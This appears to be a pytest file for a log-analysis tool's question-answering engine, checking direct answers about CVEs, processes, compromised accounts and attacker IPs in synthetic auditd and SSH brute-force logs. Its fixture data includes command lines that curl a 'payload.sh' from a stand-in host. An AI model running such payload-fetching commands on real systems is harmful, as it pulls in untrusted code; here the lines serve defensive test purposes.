"""Tests for the answer-quality upgrades: extraction questions, distinct
answers for different questions, direct answers without evidence dumps, and
evidence chains only when no direct answer exists."""

from __future__ import annotations

import pytest

from core.deterministic_qa import DeterministicQAEngine
from ai.agent import render_deterministic_report
from core.log_dataset import LogDataset
from tests.conftest import make_events


@pytest.fixture
def audit_like_dataset():
    """Dataset resembling an auditd-style root-session log (the reported
    scenario: USER_START / USER_END / CRED_DISP / command_exec for root)."""
    events = []
    t = 0
    for i in range(1, 7):
        t += 3
        events.append({
            "event_uid": f"AUD-S-{i:04d}",
            "timestamp": f"2021-10-05 52:{t:02d}".replace("52:", "05:") + ":00",
            "event_type": "USER_START",
            "username": "root",
            "host": "audit-host",
            "action": "session_open",
            "pid": str(7000 + i),
            "message": "session opened for user root",
        })
    for i in range(1, 9):
        t += 2
        events.append({
            "event_uid": f"AUD-C-{i:04d}",
            "timestamp": f"2021-10-05 05:{(t // 60) % 60:02d}:{t % 60:02d}",
            "event_type": "command_exec",
            "username": "root",
            "host": "audit-host",
            "action": "command_exec",
            "process": "curl",
            "pid": str(7100 + i),
            "command": f"curl http://192.0.2.{i % 5 + 1}/payload.sh",
            "message": "root executed command",
        })
    for i in range(1, 12):
        t += 1
        events.append({
            "event_uid": f"AUD-E-{i:04d}",
            "timestamp": f"2021-10-05 06:{(t // 60) % 60:02d}:{t % 60:02d}",
            "event_type": "USER_END",
            "username": "root",
            "host": "audit-host",
            "action": "session_close",
            "pid": str(7000 + i),
            "message": "session closed for user root",
        })
    return LogDataset(make_events(events), source_file="audit.jsonl")


class TestExtractionQuestions:
    def test_cve_question_answers_directly_about_cves(self, audit_like_dataset):
        engine = DeterministicQAEngine(audit_like_dataset.df, audit_like_dataset)
        result = engine.answer("What CVE was exploited to gain root access?")
        assert result is not None
        # No CVE exists in this dataset: the answer must say so directly,
        # NOT return a generic event-count dump.
        assert "no cve" in result.answer.lower()
        assert result.has_direct_answer

    def test_binary_and_pid_question_differs_from_cve_question(self, audit_like_dataset):
        engine = DeterministicQAEngine(audit_like_dataset.df, audit_like_dataset)
        cve = engine.answer("What CVE was exploited to gain root access?")
        binary = engine.answer("What is the name of the binary and PID used to gain root?")
        assert cve is not None and binary is not None
        # Different questions must produce different, question-specific answers.
        assert cve.answer != binary.answer
        assert "curl" in binary.answer
        assert "PID" in binary.answer or "process ID" in binary.answer.lower()

    def test_account_compromise_question_qualified(self, audit_like_dataset):
        engine = DeterministicQAEngine(audit_like_dataset.df, audit_like_dataset)
        result = engine.answer("Which account was compromised?")
        assert result is not None
        text = result.answer.lower()
        # Without any failed->successful login pattern the analyst must NOT
        # invent a compromised account.
        assert "no account shows a failed-then-successful" in text or \
               "does not support naming a compromised account" in text or \
               "compromise is not established" in text

    def test_compromise_sequence_names_the_account(self):
        """Dataset WITH failed->successful logins: the analyst must identify
        the actual evidence-backed answer (account + IP + counts)."""
        events = []
        # 30 failed logins from the attacker IP against svc_admin
        for i in range(1, 31):
            events.append({
                "event_uid": f"ATK-F-{i:04d}",
                "timestamp": f"2026-09-15T08:{i % 60:02d}:00Z",
                "event_type": "authentication",
                "source_ip": "198.51.100.23",
                "destination_ip": "10.20.1.10",
                "user": "svc_admin",
                "action": "failed_login",
                "host": "auth-01",
                "message": "SSH authentication failed",
            })
        # 3 successful logins AFTER the failures from the same IP
        for i in range(1, 4):
            events.append({
                "event_uid": f"ATK-S-{i:04d}",
                "timestamp": f"2026-09-15T09:{i:02d}:00Z",
                "event_type": "authentication",
                "source_ip": "198.51.100.23",
                "destination_ip": "10.20.1.10",
                "user": "svc_admin",
                "action": "successful_login",
                "host": "auth-01",
                "message": "SSH authentication succeeded",
            })
        # Benign background user with only successful logins
        for i in range(1, 6):
            events.append({
                "event_uid": f"ATK-B-{i:04d}",
                "timestamp": f"2026-09-15T10:{i:02d}:00Z",
                "event_type": "authentication",
                "source_ip": "10.20.5.5",
                "user": "analyst",
                "action": "successful_login",
                "host": "auth-01",
                "message": "routine login",
            })
        ds = LogDataset(make_events(events), source_file="attack.jsonl")
        engine = DeterministicQAEngine(ds.df, ds)

        compromise = engine.answer("Which account was compromised?")
        assert compromise is not None
        assert "svc_admin" in compromise.answer
        assert "30 failed" in compromise.answer or "failed login" in compromise.answer.lower()
        assert "198.51.100.23" in compromise.answer

        attacker = engine.answer("What is the attacker's IP address?")
        assert attacker is not None
        assert "198.51.100.23" in attacker.answer
        assert "Best-supported answer" in attacker.answer

        attack_type = engine.answer("What attack type was used to gain initial access?")
        assert attack_type is not None
        assert "brute-force" in attack_type.answer.lower()
        # Evidence chain: the sequence events, not a whole-dataset dump.
        report = render_deterministic_report(attack_type.to_dict())
        assert "EVIDENCE CHAIN" in report
        assert "83016" not in report  # no whole-dataset identity dump

    def test_attacker_ip_question_qualified(self, audit_like_dataset):
        engine = DeterministicQAEngine(audit_like_dataset.df, audit_like_dataset)
        result = engine.answer("What is the attacker's IP address?")
        assert result is not None
        assert "does not identify an attacker" in result.answer.lower()

    def test_tool_question_extracts_process(self, audit_like_dataset):
        engine = DeterministicQAEngine(audit_like_dataset.df, audit_like_dataset)
        result = engine.answer("What tool was used to perform system enumeration?")
        assert result is not None
        assert "curl" in result.answer or "no binary/process" in result.answer.lower()


class TestDirectAnswerFormat:
    def test_count_answer_has_no_inline_evidence_dump(self, audit_like_dataset):
        engine = DeterministicQAEngine(audit_like_dataset.df, audit_like_dataset)
        result = engine.answer("How many events involve user root?")
        assert result is not None
        assert result.has_direct_answer
        report = render_deterministic_report(result.to_dict())
        marker = "EVIDENCE & GROUNDING DETAILS"
        primary = report.split(marker)[0]
        # The primary (user-facing) part must be a concise direct answer
        # without an evidence listing.
        assert "There are" in primary
        assert "[EVID-" not in primary
        assert "CLAIM GROUNDING" not in primary
        # Verbose grounding still available in the details panel.
        assert "CLAIM GROUNDING" in report

    def test_verified_zero_shows_evidence_explanation(self, audit_like_dataset):
        engine = DeterministicQAEngine(audit_like_dataset.df, audit_like_dataset)
        result = engine.answer("How many failed logins came from 192.0.2.99?")
        assert result is not None
        report = render_deterministic_report(result.to_dict())
        assert "0 matching events" in report

    def test_abstention_includes_evidence_chain(self, audit_like_dataset):
        engine = DeterministicQAEngine(audit_like_dataset.df, audit_like_dataset)
        result = engine.answer("Do the logs prove that root was compromised?")
        assert result is not None
        report = render_deterministic_report(result.to_dict())
        # No direct factual answer is possible for a proof question: the
        # evidence chain must be present in the primary report.
        assert "EVIDENCE CHAIN" in report or "What the loaded dataset shows" in result.answer


class TestPlannerSpeed:
    def test_planner_uses_bounded_tokens_with_fallback(self, audit_like_dataset):
        from ai.investigation_agent import AgenticInvestigationRuntime, PLANNER_MAX_TOKENS
        from tests.conftest import FakeProvider

        class KwargsProvider(FakeProvider):
            def generate(self, system_prompt, user_prompt, **kwargs):
                self.calls.append(kwargs.get("max_tokens"))
                if self.responses:
                    return self.responses.pop(0)
                return "finish"

            def generate_with_progress(self, system_prompt, user_prompt, progress_callback=None, max_tokens=None):
                return self.generate(system_prompt, user_prompt, max_tokens=max_tokens)

        provider = KwargsProvider(responses=[
            '{"action":"finish","arguments":{},"reason":"deterministic facts suffice"}',
        ])
        runtime = AgenticInvestigationRuntime(provider, max_steps=3, max_tool_calls=6)
        _, report = runtime.run(
            "Explain the root activity in this log", audit_like_dataset.df, dataset=audit_like_dataset
        )
        # Planner calls pass a bounded token budget (fast responses).
        assert provider.calls and provider.calls[0] == PLANNER_MAX_TOKENS
        # The deterministic head start recorded counts before planning.
        assert report["deterministic_counts"], "head-start count missing"

    def test_defaults_are_reduced_for_speed(self):
        import os
        import importlib
        import ai.agent as agent_module

        # The production default budgets (env-overridable) must be the fast ones.
        source = open(agent_module.__file__, encoding="utf-8").read()
        assert 'LOGASIS_AI_MAX_STEPS", "3"' in source
        assert 'LOGASIS_AI_MAX_TOOL_CALLS", "6"' in source


class TestModelCatalogFilter:
    def test_non_chat_models_filtered_out(self):
        from gui.live_ai_dialog import _selectable_chat_models

        class M:
            def __init__(self, id):
                self.id = id

        models = [
            M("nvidia/llama-3.3-nemotron-super-49b-v1.5"),
            M("nvidia/nv-embedqa-e5-v5"),
            M("nvidia/nv-rerankqa-mistral-4b-v3"),
            M("nvidia/nemo-guardrails-content-safety"),
            M("openai/gpt-4o-mini"),
            M("meta/llama-3.1-8b-instruct"),
            M("some/clip-vision-model"),
        ]
        ids = _selectable_chat_models(models)
        assert "nvidia/llama-3.3-nemotron-super-49b-v1.5" in ids
        assert "openai/gpt-4o-mini" in ids
        assert "meta/llama-3.1-8b-instruct" in ids
        assert "nvidia/nv-embedqa-e5-v5" not in ids
        assert "nvidia/nv-rerankqa-mistral-4b-v3" not in ids
        assert "nvidia/nemo-guardrails-content-safety" not in ids
        assert "some/clip-vision-model" not in ids
